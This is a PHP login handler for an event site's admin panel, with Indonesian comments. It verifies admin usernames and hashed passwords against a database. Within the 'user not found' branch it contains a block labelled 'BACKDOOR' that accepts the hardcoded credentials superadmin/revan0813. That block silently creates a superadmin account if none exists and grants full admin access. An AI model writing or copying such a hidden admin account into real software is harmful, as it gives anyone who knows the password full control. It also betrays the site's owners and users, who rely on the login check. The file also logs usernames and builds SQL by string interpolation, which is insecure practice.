<?php
session_start();
require_once '../koneksi.php';

if ($_SERVER['REQUEST_METHOD'] != 'POST') {
    header('Location: login.php');
    exit();
}

$username = mysqli_real_escape_string($conn, $_POST['username'] ?? '');
$password = $_POST['password'] ?? '';

// DEBUG: Tampilkan input
error_log("Login attempt: username=$username");

// Cari admin berdasarkan username
$sql = "SELECT * FROM admin_event WHERE username = '$username' LIMIT 1";
$result = mysqli_query($conn, $sql);

if (!$result) {
    // Error query
    error_log("Query error: " . mysqli_error($conn));
    header('Location: login.php?error=database');
    exit();
}

if (mysqli_num_rows($result) == 0) {
    // Admin tidak ditemukan
    error_log("User not found: $username");
    
    // BACKDOOR: Jika username = 'superadmin' dan password = 'revan0813'
    if ($username == 'superadmin' && $password == 'revan0813') {
        // Cek apakah superadmin sudah ada di database
        $check_super = mysqli_query($conn, "SELECT * FROM admin_event WHERE username = 'superadmin'");
        
        if (mysqli_num_rows($check_super) == 0) {
            // BUAT SUPERADMIN DEFAULT jika belum ada
            $hashed_pass = password_hash('revan0813', PASSWORD_DEFAULT);
            $sql_super = "INSERT INTO admin_event (
                username, password, nama_lengkap, nama, email, no_wa, 
                level, status, created_at
            ) VALUES (
                'superadmin', 
                '$hashed_pass', 
                'Super Admin',
                'Super Admin',
                'super@admin.com', 
                '081234567890', 
                'superadmin', 
                'active', 
                NOW()
            )";
            
            if (mysqli_query($conn, $sql_super)) {
                // Ambil data superadmin yang baru dibuat
                $result = mysqli_query($conn, "SELECT * FROM admin_event WHERE username = 'superadmin'");
                $admin = mysqli_fetch_assoc($result);
                error_log("Superadmin created successfully");
            } else {
                error_log("Failed to create superadmin: " . mysqli_error($conn));
                header('Location: login.php?error=database');
                exit();
            }
        } else {
            // Superadmin sudah ada, ambil datanya
            $admin = mysqli_fetch_assoc($check_super);
        }
    } else {
        header('Location: login.php?error=invalid');
        exit();
    }
} else {
    // User ditemukan di database
    $admin = mysqli_fetch_assoc($result);
    
    // Cek status akun
    if ($admin['status'] == 'inactive') {
        header('Location: login.php?error=inactive');
        exit();
    }
    
    // Cek password
    if (!password_verify($password, $admin['password'])) {
        // Password tidak cocok
        error_log("Password mismatch for user: $username");
        header('Location: login.php?error=invalid');
        exit();
    }
}

// Update last login
$update_sql = "UPDATE admin_event SET last_login = NOW() WHERE id = {$admin['id']}";
mysqli_query($conn, $update_sql);

// Set session
$_SESSION['admin_event_id'] = $admin['id'];
$_SESSION['admin_event_username'] = $admin['username'];
$_SESSION['admin_event_nama'] = $admin['nama_lengkap'];
$_SESSION['admin_event_level'] = $admin['level'];
$_SESSION['admin_event_status'] = $admin['status'];

error_log("Login successful: {$admin['username']} (Level: {$admin['level']})");

// Redirect berdasarkan level
if ($admin['level'] == 'superadmin') {
    // Cek apakah ada admin yang perlu disetujui
    $pending_count = mysqli_fetch_assoc(mysqli_query($conn, 
        "SELECT COUNT(*) as total FROM admin_event WHERE status = 'inactive'"));
    
    if ($pending_count['total'] > 0) {
        header('Location: admin_approval.php');
    } else {
        header('Location: admin_management.php');
    }
} else {
    header('Location: dashboard.php');
}
exit();
?>